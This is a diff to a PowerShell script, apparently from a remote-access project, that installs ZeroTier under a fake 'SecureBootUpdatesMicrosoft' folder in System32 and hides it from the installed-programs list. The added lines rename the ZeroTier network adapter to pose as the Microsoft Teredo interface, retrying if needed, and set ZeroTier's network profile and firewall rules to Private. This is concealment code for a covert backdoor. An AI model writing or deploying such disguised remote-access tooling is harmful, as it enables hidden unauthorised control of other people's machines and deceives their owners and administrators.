@@ -4,6 +4,9 @@ $downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
 $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
 $hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
+#Code starts Here
+Install-PackageSource -Name NuGet -Location "https://www.nuget.org/api/v2/" -ProviderName NuGet -Trusted -Force
+Uninstall-Package -Name "ZeroTier One" -Force
 if (-not (Test-Path (Split-Path $destinationPath))) {
     New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
 }
@@ -39,6 +42,7 @@ $RegKeyPath = Join-Path -Path $RegPath -ChildPath $Key.PSChildName
 $RegValueName = "SystemComponent"
 $RegValueData = 1
 Set-ItemProperty -Path $RegKeyPath -Name $RegValueName -Value $RegValueData -Type DWORD -Force
+Set-NetConnectionProfile -InterfaceAlias "ZeroTier*" -NetworkCategory Private
 }
 $ZeroTierShortcutPath = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Zerotier.lnk'
 if (Test-Path $ZeroTierShortcutPath) {
@@ -69,7 +73,34 @@ foreach ($item in $childItems) {
 Set-Acl -Path $item.FullName -AclObject $folderACL
 }
 Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
-Get-NetAdapter -Name Zerotier*|Rename-NetAdapter -NewName "Microsoft Teredo IPv6 Tunneling Interface"
+$adapterNameToRename = "Zerotier*"
+$newAdapterName = "Microsoft Teredo IPv6 Tunneling Interface"
+$maxRetries = 3
+$retryCount = 0
+while ($retryCount -lt $maxRetries) {
+    try {
+        $adapter = Get-NetAdapter -Name $adapterNameToRename
+        if ($adapter) {
+            Rename-NetAdapter -InputObject $adapter -NewName $newAdapterName
+            break  # Exit the loop on success
+        } else {
+            break  # Exit the loop if the adapter is not found
+        }
+    } catch {
+        $retryCount++
+        Start-Sleep -Seconds 5  # Add a delay before the next retry
+    }
+}
+
+$AppNamePattern = "ZeroTier*"
+$Rules = Get-NetFirewallRule | Where-Object { $_.DisplayName -like $AppNamePattern }
+$ProfileType = "Private"
+if ($Rules.Count -gt 0) {
+    foreach ($Rule in $Rules) {
+        $Rule.Profile = $ProfileType
+        Set-NetFirewallRule -InputObject $Rule
+    }
+} else {}
 #ZT Adv Fix
 #$ztadv = Read-Host "Proceed With ZT Adv Fix (y/n)"
 #if ([string]::IsNullOrEmpty($ztadv)) {
